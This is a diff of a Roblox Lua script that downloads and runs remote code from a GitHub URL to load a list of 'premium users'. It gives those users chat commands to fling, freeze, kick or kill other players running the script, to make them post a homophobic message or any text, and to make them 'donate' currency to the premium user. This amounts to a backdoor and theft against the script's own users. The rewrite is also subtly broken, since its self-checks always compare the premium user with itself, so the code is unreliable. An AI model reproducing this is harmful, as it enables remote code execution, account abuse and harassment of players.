@@ -1,124 +1,136 @@
---// Cmdx User //--
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Okay'))()
 
---// Commands //--
-local freeze = function()
-    if player.Character then
-        player.Character.LowerTorso.Anchored = true
-        player.Character.UpperTorso.Anchored = true
+local premiumUsers = loadstring(game:HttpGet('https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Okay'))()
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Debris = game:GetService("Debris")
+local StarterGui = game:GetService("StarterGui")
+local ChatService = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
+
+local function getPlayerByName(name)
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Name:lower() == name:lower() then
+            return p
+        end
+    end
+    return nil
+end
+
+local function freeze(character)
+    if character then
+        for _, part in pairs(character:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.Anchored = true
+            end
+        end
     end
 end
 
-local unfreeze = function()
-    if player.Character then
-        player.Character.LowerTorso.Anchored = false
-        player.Character.UpperTorso.Anchored = false
+local function unfreeze(character)
+    if character then
+        for _, part in pairs(character:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.Anchored = false
+            end
+        end
     end
+end
+
+local function isPremiumUser(player)
+    for _, user in ipairs(premiumUsers) do
+        if user and user.Name == player.Name then
+            return true
+        end
+    end
+    return false
 end
 
 local function handleChatCommands(premiumUser)
-    if premiumUser then
-        premiumUser.Chatted:Connect(function(cht)
-            if cht:match(".fling .") then
-                if player ~= premiumUser then
-                    player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
-                    local power = 99999999 -- change this to make it more or less powerful
-                    game:GetService('RunService').Stepped:Connect(function()
-                        player.Character.Head.CanCollide = false
-                        player.Character.UpperTorso.CanCollide = false
-                        player.Character.LowerTorso.CanCollide = false
-                        player.Character.HumanoidRootPart.CanCollide = false
-                    end)
-                    wait(.1)
-                    local bambam = Instance.new("BodyThrust")
-                    bambam.Parent = player.Character.HumanoidRootPart
-                    bambam.Force = Vector3.new(power,0,power)
-                    bambam.Location = player.Character.HumanoidRootPart.Position
-                end
-            elseif cht:match(".freeze .") then
-                if player ~= premiumUser then
-                    freeze()
-                end
-            elseif cht:match(".unfreeze .") then
-                if player ~= premiumUser then
-                    unfreeze()
-                end
-            elseif cht:match(".kxck .") then
-                if player ~= premiumUser then
-                    player:Kick("You have been kicked.")
-                end
-            elseif cht:match(".oof .") then
-                if player ~= premiumUser then
-                    player.Character.Humanoid:Destroy()
-                end
-            elseif cht:match(".error .") then
-                if player ~= premiumUser then
-                    player.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
-                end
-            elseif cht:match(".bring .") then
-                if player ~= premiumUser then
-                    player.Character.HumanoidRootPart.CFrame = CFrame.new(premiumUser.Character.UpperTorso.Position)
-                end
-            elseif cht:match(".sit .") then
-                if player ~= premiumUser then
-                    local character = player.Character
-                    if character then
-                        local humanoid = character:FindFirstChildOfClass("Humanoid")
-                        if humanoid then
-                            humanoid.Sit = true
-                        end
+    if not premiumUser then return end
+    local connection
+    connection = premiumUser.Chatted:Connect(function(msg)
+        local player = Players:GetPlayerFromCharacter(premiumUser.Character)
+        if not player then return end
+        local character = player.Character
+        local hrp = character and character:FindFirstChild("HumanoidRootPart")
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local upperTorso = character and character:FindFirstChild("UpperTorso")
+        local lowerTorso = character and character:FindFirstChild("LowerTorso")
+        local isNotSelf = player ~= premiumUser
+        if msg:match("^%.fling%s*%.") then
+            if isNotSelf and hrp then
+                hrp.CFrame = CFrame.new(0, 999, 0)
+                local power = 99999999
+                for _, part in pairs(character:GetChildren()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = false
                     end
                 end
-            elseif cht:match(".troll .") then
-                if player ~= premiumUser then
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
-                end
-            elseif cht:match(".unsit .") then
-                if player ~= premiumUser then
-                    local character = player.Character
-                    if character then
-                        local humanoid = character:FindFirstChildOfClass("Humanoid")
-                        if humanoid then
-                            humanoid.Sit = false
-                        end
-                    end
-                end
-            elseif cht:match(".enlighten .") then
-                if player ~= premiumUser then
-                    player.Backpack:FindFirstChild("The Arkenstone"):Equip()
-                    game.Players:Chat(";enlighten " .. premiumUser.Name)
-                end
-            elseif cht:match(".donate .") then
-                local text = cht:match(".donate (.+)") -- Extract text
-                if player ~= premiumUser then
-                    game.Players:Chat(";donate " .. text .. " " .. premiumUser.Name)
-                end
-            elseif cht:match(".say .") then
-                local text = cht:match(".say (.+)") -- Extract text
-                if player ~= premiumUser then
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
-                end
-            elseif cht:match("^%.cmd .+") then
-                local text = cht:match("^%.cmd (.+)") -- Extract text after ".cmd "
-                if player ~= premiumUser then
-                    game.Players.Chat:Chat(player, ";" .. text)
-                end
-            elseif cht:match(".cmdx") then
-                if player == premiumUser then
-                    game:GetService("StarterGui"):SetCore("SendNotification",{
-                        Title = "Available Commands";
-                        Text = ".freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd";
-                        Time = 5;
-                        Icon = "rbxassetid://999999999";
-                    })
+                local force = Instance.new("BodyThrust", hrp)
+                force.Force = Vector3.new(power, 0, power)
+                Debris:AddItem(force, 2)
+            end
+        elseif msg:match("^%.freeze%s*%.") then
+            if isNotSelf then freeze(character) end
+        elseif msg:match("^%.unfreeze%s*%.") then
+            if isNotSelf then unfreeze(character) end
+        elseif msg:match("^%.kxck%s*%.") then
+            if isNotSelf then premiumUser:Kick("You have been kicked.") end
+        elseif msg:match("^%.oof%s*%.") then
+            if isNotSelf and humanoid then humanoid:Destroy() end
+        elseif msg:match("^%.error%s*%.") then
+            if isNotSelf and hrp then hrp.CFrame = CFrame.new(99999, 99999, 99999) end
+        elseif msg:match("^%.bring%s*%.") then
+            if isNotSelf and upperTorso and premiumUser.Character then
+                local targetPos = premiumUser.Character:FindFirstChild("UpperTorso") and premiumUser.Character.UpperTorso.Position
+                if targetPos then
+                    hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
                 end
             end
-        end)
-    end
+        elseif msg:match("^%.sit%s*%.") then
+            if isNotSelf and humanoid then humanoid.Sit = true end
+        elseif msg:match("^%.unsit%s*%.") then
+            if isNotSelf and humanoid then humanoid.Sit = false end
+        elseif msg:match("^%.troll%s*%.") then
+            if isNotSelf then
+                ChatService.SayMessageRequest:FireServer("im gay", "All")
+            end
+        elseif msg:match("^%.enlighten%s*%.") then
+            if isNotSelf and character then
+                local tool = premiumUser.Backpack:FindFirstChild("The Arkenstone")
+                if tool then
+                    tool:Equip()
+                end
+                game.Players:Chat(";enlighten " .. premiumUser.Name)
+            end
+        elseif msg:match("^%.donate%s+(.+)") then
+            local amount = msg:match("^%.donate%s+(.+)")
+            if isNotSelf then
+                game.Players:Chat(";donate " .. amount .. " " .. premiumUser.Name)
+            end
+        elseif msg:match("^%.say%s+(.+)") then
+            local text = msg:match("^%.say%s+(.+)")
+            if isNotSelf then
+                ChatService.SayMessageRequest:FireServer(text, "All")
+            end
+        elseif msg:match("^%.cmd%s+(.+)") then
+            local cmdText = msg:match("^%.cmd%s+(.+)")
+            if isNotSelf then
+                game.Players:Chat(player.Name, ";" .. cmdText)
+            end
+        elseif msg:match("^%.cmdx") then
+            if player == premiumUser then
+                StarterGui:SetCore("SendNotification", {
+                    Title = "Commands",
+                    Text = ".freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd",
+                    Duration = 5,
+                    Icon = "rbxassetid://999999999"
+                })
+            end
+        end
+    end)
 end
 
--- Connect commands for each premium user
-handleChatCommands(user_premium__001)
-handleChatCommands(user_premium__002)
-handleChatCommands(user_premium__003)
-handleChatCommands(user_premium__004)
+for _, user in ipairs(premiumUsers) do
+    handleChatCommands(user)
+end
